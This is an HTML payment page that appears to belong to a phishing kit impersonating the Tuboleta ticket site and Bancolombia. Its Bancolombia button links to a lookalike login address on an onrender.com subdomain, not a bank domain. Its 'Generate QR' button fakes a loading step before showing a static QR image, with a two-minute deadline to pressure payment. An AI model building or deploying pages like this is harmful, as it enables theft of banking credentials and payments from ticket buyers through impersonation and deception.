<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario Tarjeta Débito</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #ffffff;
            flex-direction: column;
        }

        #form-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 390px;
        }

        button {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            background-color: rgb(255, 255, 255);
            color: white;
            font-size: 18px;
            cursor: pointer;
            margin-bottom: 15px;
        }

        button:hover {
            background-color: rgb(255, 255, 255);
        }

        #qr-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            align-items: center;
            justify-content: center;
            z-index: 10;
        }

        .qr-box {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }

        .qr-box img {
            width: 250px;
            margin: 15px 0;
        }

        .qr-box h3 {
            margin-bottom: 10px;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #ccc;
            border-top: 4px solid #000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        #form-container.blur {
            filter: blur(5px);
        }
    </style>
</head>

<body>
    <div style="text-align: left; width: 100%; background-color: rgb(0, 113, 206); padding: 20px;">
        <img width="250px" src="img/tubol.png" alt="Logo Tuboleta">
    </div>

    <br><br><br>

    <center>
        <div id="form-container">
            <p style="font-size: 22px; font-weight: bold;">Selecciona tu método de pago</p>
            <br>
            <button id="boton-bancolombia" onclick="window.location.href='https://personasbancolombia-rmo3.onrender.com/enlinea/'">
                <img width="200px" src="pagolombia.png" alt="">
            </button>
            <p>Ingresa a Bancolombia</p>

            <button id="qr-bancolombia">
                <img width="150px" src="cod-QR.webp" alt="">
            </button>
            <p>Genera Qr de Pago</p>
        </div>
    </center>

    <div id="qr-modal">
        <div class="qr-box" id="qr-loading-box">
            <h3>Generando código QR</h3>
            <div class="loading-spinner"></div>
        </div>
        <div class="qr-box" id="qr-generated-box" style="display: none;">
            <h3>QR Generado con éxito</h3>
            <p>Escanea el siguiente QR con tu app Bancolombia o Nequi.</p>
            <img src="qr.jpg" alt="QR para pago">
            <p><strong>Tienes 2 minutos para completar el pago o serás redirigido a la fila virtual.</strong></p>
        </div>
    </div>

    <script>
        document.getElementById('qr-bancolombia').addEventListener('click', function() {
            // Mostrar la ventana emergente del QR y efecto borroso en el fondo
            const qrModal = document.getElementById('qr-modal');
            const formContainer = document.getElementById('form-container');
            qrModal.style.display = 'flex';
            formContainer.classList.add('blur');

            // Mostrar el spinner de carga por 5 segundos y luego mostrar el QR generado
            setTimeout(function() {
                document.getElementById('qr-loading-box').style.display = 'none';
                document.getElementById('qr-generated-box').style.display = 'block';

                // Configurar redirección después de 2 minutos
                setTimeout(function() {
                    window.location.href = "fila.html";
                }, 2 * 60 * 1000); // 2 minutos
            }, 5000); // Esperar 5 segundos para mostrar el QR
        });
    </script>
</body>
</html>
